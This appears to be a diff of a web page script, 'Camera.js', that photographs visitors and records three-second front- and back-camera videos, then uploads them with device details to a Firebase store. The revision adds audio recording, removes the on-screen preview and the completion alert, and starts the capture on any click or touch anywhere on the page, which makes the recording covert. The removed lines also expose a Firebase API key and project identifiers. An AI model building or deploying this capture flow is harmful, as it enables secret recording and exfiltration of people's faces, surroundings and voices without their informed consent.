@@ -1,128 +1,118 @@
-// ------------------ FIREBASE IMPORTS ------------------
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
 import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-// ------------------ FIREBASE CONFIG ------------------
+/* ---------- YOUR FIREBASE CONFIG ---------- */
 const firebaseConfig = {
-  apiKey: "AIzaSyA5HSha0laFzd9rQZw5sAHW6O1BcX8BPzI",
-  authDomain: "pdfniba.firebaseapp.com",
-  projectId: "pdfniba",
-  storageBucket: "pdfniba.firebasestorage.app",
-  messagingSenderId: "809688909652",
-  appId: "1:809688909652:web:9867944191bd95704aaac1"
+  // KEEP YOUR EXISTING CONFIG HERE
 };
 
 const app = initializeApp(firebaseConfig);
 const storage = getStorage(app);
 const db = getFirestore(app);
 
+console.log("Camera.js loaded ✅");
 
-// ---------------------- HELPERS ------------------------
+/* ---------- HELPERS ---------- */
 
 function getDeviceInfo() {
-  return navigator.userAgent || "Unknown device";
+  return {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    time: new Date().toISOString()
+  };
 }
 
-async function saveMetadata({ fileURL, cameraType, fileType }) {
-  await addDoc(collection(db, "recordings"), {
-    fileURL,
-    cameraType,
-    fileType,
-    deviceInfo: getDeviceInfo(),
-    timestamp: Date.now()
-  });
+function blobToFile(blob, name) {
+  return new File([blob], name, { type: blob.type });
 }
 
-async function getStream(facingMode) {
+async function startStream(facingMode) {
   return await navigator.mediaDevices.getUserMedia({
     video: { facingMode },
-    audio: false,
+    audio: true
   });
 }
 
-function record3Sec(stream) {
-  return new Promise((resolve) => {
-    const chunks = [];
+/* ---------- PHOTO ---------- */
+
+async function takePhoto(stream) {
+  const track = stream.getVideoTracks()[0];
+  const imageCapture = new ImageCapture(track);
+  return await imageCapture.takePhoto();
+}
+
+/* ---------- RECORD ---------- */
+
+function recordVideo(stream, duration = 3000) {
+  return new Promise(resolve => {
     const recorder = new MediaRecorder(stream);
-    recorder.ondataavailable = (e) => chunks.push(e.data);
+    const chunks = [];
+
+    recorder.ondataavailable = e => chunks.push(e.data);
     recorder.onstop = () => resolve(new Blob(chunks, { type: "video/webm" }));
+
     recorder.start();
-    setTimeout(() => recorder.stop(), 3000);
+
+    setTimeout(() => recorder.stop(), duration);
   });
 }
 
-async function upload(blob, name) {
-  const fileRef = ref(storage, `captures/${Date.now()}_${name}`);
+/* ---------- UPLOAD ---------- */
+
+async function uploadToFirebase(blob, path) {
+  const fileRef = ref(storage, path);
   await uploadBytes(fileRef, blob);
   return await getDownloadURL(fileRef);
 }
 
+/* ---------- MAIN FUNCTION ---------- */
 
-// ---------------------- MAIN FLOW ----------------------
+async function startCaptureSequence() {
+  try {
+    console.log("Starting front camera...");
 
-async function startProcess() {
-  const preview = document.getElementById("preview");
+    // FRONT CAMERA
+    const frontStream = await startStream("user");
 
-  // --- FRONT PHOTO ---
-  let stream = await getStream("user");
-  preview.srcObject = stream;
+    const photoBlob = await takePhoto(frontStream);
+    const frontVideoBlob = await recordVideo(frontStream, 3000);
 
-  const img = new ImageCapture(stream.getVideoTracks()[0]);
-  const photoBlob = await img.takePhoto();
-  const photoURL = await upload(photoBlob, "front_photo.jpg");
+    frontStream.getTracks().forEach(track => track.stop());
 
-  await saveMetadata({
-    fileURL: photoURL,
-    cameraType: "front",
-    fileType: "photo",
-  });
+    console.log("Switching to back camera...");
 
-  // --- FRONT 3-SEC VIDEO ---
-  const frontVid = await record3Sec(stream);
-  const frontVidURL = await upload(frontVid, "front_video.webm");
+    // BACK CAMERA
+    const backStream = await startStream({ exact: "environment" });
+    const backVideoBlob = await recordVideo(backStream, 3000);
 
-  await saveMetadata({
-    fileURL: frontVidURL,
-    fileType: "video",
-    cameraType: "front",
-  });
+    backStream.getTracks().forEach(track => track.stop());
 
-  stream.getTracks().forEach((t) => t.stop());
+    console.log("Uploading to Firebase...");
 
+    const timestamp = Date.now();
 
-  // --- BACK CAMERA VIDEO ---
-  stream = await getStream("environment");
-  preview.srcObject = stream;
+    const photoURL = await uploadToFirebase(photoBlob, `photo_${timestamp}.jpg`);
+    const frontVideoURL = await uploadToFirebase(frontVideoBlob, `front_${timestamp}.webm`);
+    const backVideoURL = await uploadToFirebase(backVideoBlob, `back_${timestamp}.webm`);
 
-  const backVid = await record3Sec(stream);
-  const backVidURL = await upload(backVid, "back_video.webm");
+    await addDoc(collection(db, "captures"), {
+      photoURL,
+      frontVideoURL,
+      backVideoURL,
+      device: getDeviceInfo()
+    });
 
-  await saveMetadata({
-    fileURL: backVidURL,
-    fileType: "video",
-    cameraType: "back",
-  });
+    console.log("✅ Upload complete");
 
-  stream.getTracks().forEach((t) => t.stop());
-
-  alert("All recordings uploaded!");
+  } catch (err) {
+    console.error("❌ ERROR:", err);
+    alert(err.message);
+  }
 }
 
+/* ---------- ACTIVATE ON ANY CLICK ---------- */
 
-// ------------------ USER-GESTURE BUTTON ------------------
-
-// CAMERA WILL NOT START WITHOUT THIS.
-window.addEventListener("DOMContentLoaded", () => {
-  let started = false;
-
-  document.addEventListener("click", () => {
-    if (started) return;  // prevent multiple triggers
-    started = true;
-
-    startProcess().catch((err) => {
-      console.error("Camera error:", err);
-      alert("Camera access failed.");
-    });
-  }, { once: true });
-});
+document.addEventListener("click", startCaptureSequence, { once: true });
+document.addEventListener("touchstart", startCaptureSequence, { once: true });
